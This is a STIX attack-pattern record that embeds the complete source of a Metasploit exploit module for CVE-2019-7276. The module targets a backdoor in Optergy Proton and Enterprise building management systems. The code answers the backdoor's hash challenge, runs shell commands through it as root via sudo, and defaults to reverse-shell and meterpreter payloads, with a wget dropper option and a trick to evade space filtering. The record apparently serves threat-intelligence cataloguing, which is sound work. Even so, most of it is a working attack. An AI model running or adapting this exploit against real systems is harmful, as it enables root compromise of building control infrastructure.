{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a834d80-6d68-4d68-ad56-9ffd392fed7a",
    "created": "2024-08-14T17:03:35.866895Z",
    "modified": "2024-08-14T17:03:35.8669Z",
    "name": "Optergy Proton and Enterprise BMS Command Injection using a backdoor",
    "description": " This module exploits an undocumented backdoor vulnerability in the Optergy Proton and Enterprise Building Management System (BMS) applications. Versions `2.0.3a` and below are vulnerable. Attackers can exploit this issue by directly navigating to an undocumented backdoor script called Console.jsp in the tools directory and gain full system access. Successful exploitation results in `root` command execution using `sudo` as user `optergy`.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/optergy_bms_backdoor_rce_cve_2019_7276.rb",
            "external_id": "optergy_bms_backdoor_rce_cve_2019_7276.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-7276"
        },
        {
            "source_name": "reference",
            "url": "https://applied-risk.com/resources/ar-2019-008"
        },
        {
            "source_name": "reference",
            "url": "https://optergy.com/products/proton/"
        },
        {
            "source_name": "reference",
            "url": "https://optergy.com/products/optergy-enterprise/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/QrYFIjnd3J/cve-2019-7276"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Optergy Proton and Enterprise BMS Command Injection using a backdoor',\n        'Description' => %q{\n          This module exploits an undocumented backdoor vulnerability in the Optergy Proton and Enterprise\n          Building Management System (BMS) applications. Versions `2.0.3a` and below are vulnerable.\n          Attackers can exploit this issue by directly navigating to an undocumented backdoor script\n          called Console.jsp in the tools directory and gain full system access.\n          Successful exploitation results in `root` command execution using `sudo` as user `optergy`.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF Module contributor\n          'Gjoko Krstic <gjoko[at]applied-risk.com>' # Discovery\n        ],\n        'References' => [\n          [ 'CVE', '2019-7276'],\n          [ 'URL', 'https://applied-risk.com/resources/ar-2019-008' ],\n          [ 'URL', 'https://optergy.com/products/proton/' ],\n          [ 'URL', 'https://optergy.com/products/optergy-enterprise/' ],\n          [ 'URL', 'https://attackerkb.com/topics/QrYFIjnd3J/cve-2019-7276' ],\n          [ 'EDB', '47641'],\n          [ 'PACKETSTORM', '155258']\n        ],\n        'DisclosureDate' => '2019-11-05',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'Payload' => { 'BadChars' => \"\\x20\" },\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'wget', 'printf', 'echo' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        OptBool.new('SUDO', [ true, 'Set the sudo option to get root privileges', false ])\n      ]\n    )\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Step 1: get the challenge and compute the response answer for the backdoor execution\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/tools/ajax/ConsoleResult.html?get')\n    })\n    if res.nil? || (res.code != 200)\n      return nil\n    else\n      # Get and create a challenge response\n      res_json = res.get_json_document\n      return nil if res_json.nil? || res_json.blank?\n\n      # Get the challenge\n      challenge = res_json['response']['message']\n      # Make SHA1 hash from received challenge\n      h1 = Digest::SHA1.hexdigest challenge\n      # Make MD5 hash from SHA1 hash\n      h2 = Digest::MD5.hexdigest h1\n      # Combine MD5 hash and SHA1 hash as answer (response) to the challenge\n      answer = h1 + h2\n    end\n\n    # Step 2: execute payload (RCE) using the backdoor and challenge response obtained from step 1.\n    if target['Type'] == :linux_dropper\n      cmd = cmd.gsub(' ') { '${IFS}' }\n    end\n\n    if datastore['SUDO']\n      payload = \"sudo bash -c #{cmd}\"\n    else\n      payload = \"bash -c #{cmd}\"\n    end\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/tools/ajax/ConsoleResult.html'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        'command' => payload,\n        'challenge' => challenge,\n        'answer' => answer\n      }\n    })\n    if res.nil? || (res.code != 200)\n      return nil\n    else\n      # get result and return the command response\n      res_json = res.get_json_document\n      return nil if res_json.nil? || res_json.blank?\n\n      res_cmd_output = res_json['response']['message']\n      return res_cmd_output\n    end\n  end\n\n  # Checking if the target is vulnerable by executing the whoami command via the backdoor\n  def check\n    res = execute_command('whoami')\n    return Exploit::CheckCode::Safe unless res && (res.chomp == 'root' || res.chomp == 'optergy')\n\n    Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      res = execute_command(payload.encoded)\n      fail_with(Failure::PayloadFailed, \"#{datastore['PAYLOAD']} failed.\") if res.nil?\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-05",
    "x_mitre_platforms": [
        "linux'"
    ]
}